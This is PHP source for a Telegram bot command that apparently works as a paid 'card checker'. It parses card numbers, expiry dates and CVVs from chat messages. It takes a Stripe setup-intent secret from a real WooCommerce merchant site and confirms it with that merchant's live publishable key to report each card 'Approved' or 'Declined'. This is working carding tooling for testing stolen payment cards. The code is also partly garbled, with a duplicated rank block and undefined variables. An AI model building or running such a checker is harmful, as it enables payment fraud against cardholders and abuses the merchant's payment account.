<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

    //=======RANK DETERMINE END=========//
    $update = json_decode(file_get_contents("php://input"), TRUE);
    $text = $update["message"]["text"];
    //========WHO CAN CHECK FUNC========//
    $r = "112";

    $r = rand(112, 199);
    //=====WHO CAN CHECK FUNC END======//
    if (preg_match('/^(\/sq|\.sq|!sq)/', $text)) {
        $userid = $update['message']['from']['id'];

        if (!checkAccess($userid)) {
            $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
          exit();
        }
    $start_time = microtime(true);

      $chatId = $update["message"]["chat"]["id"];
        $message_id = $update["message"]["message_id"];
        $keyboard = "";
      $message = substr($message, 4);
      $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...⏳</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id
      ]);
      $messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

      $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
      $mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
      $ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
      $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
      $amt = '1';
      if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
          bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"Wrong Format!\n ⚠️• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code> Charge 1 USD</code>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          return;
      };
      if(strlen($ano) == '4'){
          $an = substr($ano, 2);
      }
      else{
        $an = $ano;
      }
          $amount = $amt * 100;
      //------------Card info------------//
      $lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
      curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'Host: lookup.binlist.net',
      'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
      $fim = curl_exec($ch);
      $bank = GetStr($fim, '"bank":{"name":"', '"');
      $name = strtoupper(GetStr($fim, '"name":"', '"'));
      $brand = strtoupper(GetStr($fim, '"brand":"', '"'));
      $country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
      $scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
      $emoji = GetStr($fim, '"emoji":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
              $bin = 'Card Declined';
              }else{
              $bin = 'Your card was declined.';
              };        
         //IF BIN ARE NOT AVAILABLE ----//
          if (empty($scheme)) {
              $scheme = "N/A";
          }
          if (empty($type)) {
              $type = "N/A";
          }
          if (empty($brand)) {
              $brand = "N/A";
          }
          if (empty($bank)) {
              $bank = "N/A";
          }
          if (empty($name)) {
              $name = "N/A";
          }
          if (empty($emoji)) {
              $emoji = "N/A";
          }
          if (empty($currency)) {
              $currency = "N/A";
          }
      curl_close($ch);
      //------------Card info------------//

      # -------------------- [1 REQ] -------------------#
          $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.com/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=stripe_cc');
          $result1 = curl_exec($ch);
          $client = Getstr($result1,'"client_secret":"','"');
          $pi = Getstr($result1,'"client_secret":"','_secret');




          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$pi.'/confirm');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
          $result2 = curl_exec($ch);
          $msg2 = Getstr($result2,'"message": "','"');

        $end_time = microtime(true);
      $time = number_format($end_time - $start_time, 2);
        ////////--[Responses]--////////

          if(strpos($result2, '"status": "succeeded"' )) {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Square Auth</code>
𝐑𝐞𝐩𝐨𝐬𝐞 ↯ <code>Approved 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
          elseif((empty($client)) || (empty($pi))) {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Square Auth</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg $bin 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
          else {
              bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>Square Auth</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg $bin 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$type - $brand - $scheme</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$name $emoji</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  ]);
          }
      }
      ?>
